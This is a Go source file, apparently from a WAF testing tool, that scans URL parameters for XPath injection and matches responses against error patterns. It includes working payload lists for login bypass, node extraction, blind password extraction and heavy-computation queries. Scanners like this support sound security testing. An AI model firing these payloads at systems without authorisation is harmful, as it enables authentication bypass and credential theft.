// Package xpath provides XPath injection testing
package xpath

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures XPath injection testing
type Config struct {
	attackconfig.Base
	Headers map[string]string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutProbing,
		},
	}
}

// Result represents an XPath injection test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs XPath injection testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new XPath injection scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutProbing
	}

	return &Scanner{
		config:  config,
		client:  httpclient.Default(),
		results: make([]Result, 0),
	}
}

// Scan tests a URL for XPath injection
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param, value := range params {
		for _, payload := range Payloads() {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = value + payload

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
				s.config.NotifyVulnerabilityFound()
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// testPayload tests a single XPath injection payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param, payload string, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload,
		Timestamp: time.Now(),
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body))
	if result.Vulnerable {
		result.Severity = "HIGH"
	}

	return result
}

// detectVulnerability checks response for XPath injection indicators
func (s *Scanner) detectVulnerability(body string) (bool, string) {
	bodyLower := strings.ToLower(body)

	errorPatterns := []string{
		"xpath",
		"xmlerror",
		"xml parsing",
		"simplexml",
		"domdocument",
		"xmlreader",
		"saxparser",
		"lxml",
		"invalid expression",
		"undefined function",
		"invalid predicate",
		"unregistered function",
		"unterminated",
		"expected token",
		"namespace error",
	}

	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true, "XPath error pattern detected: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns XPath injection payloads
func Payloads() []string {
	return []string{
		// Basic XPath injection
		"'",
		"\"",
		"' or '1'='1",
		"\" or \"1\"=\"1",
		"' or ''='",
		"\" or \"\"=\"",

		// XPath 1.0 injection
		"' or 1=1 or '",
		"' or 1=1]--",
		"' or 1=1]/*",
		"'] | //user/*[1='",

		// XPath 2.0 injection
		"')] | //user/password | //*[('",
		"') or ('1'='1",
		"\") or (\"1\"=\"1",

		// Authentication bypass
		"admin' or '1'='1",
		"' or '1'='1' or '",
		"1' or '1'='1",
		"' or 1=1 or ''='",

		// Blind XPath
		"' or string-length(name())=0 or '",
		"' or substring(name(),1,1)='a' or '",
		"' or count(//user)>0 or '",

		// Comment injection
		"']//comment()[0]='",
		"<!--",

		// Node extraction
		"']//*[1]|//*['",
		"' | //*/text() | //*['",

		// Function abuse
		"' or true() or '",
		"' and false() or '",
		"' or not(false()) or '",

		// Axis manipulation
		"']/parent::*['",
		"']/child::*['",
		"']/ancestor::*['",
	}
}

// BlindPayloads returns blind XPath injection payloads
func BlindPayloads() []string {
	return []string{
		// Boolean extraction
		"' or string-length(//user[1]/password)>0 or '",
		"' or substring(//user[1]/password,1,1)='a' or '",
		"' or count(//user)=1 or '",

		// Time-based (via heavy computation)
		"' or count(//*[count(//*[count(//*)])>0])>0 or '",
	}
}
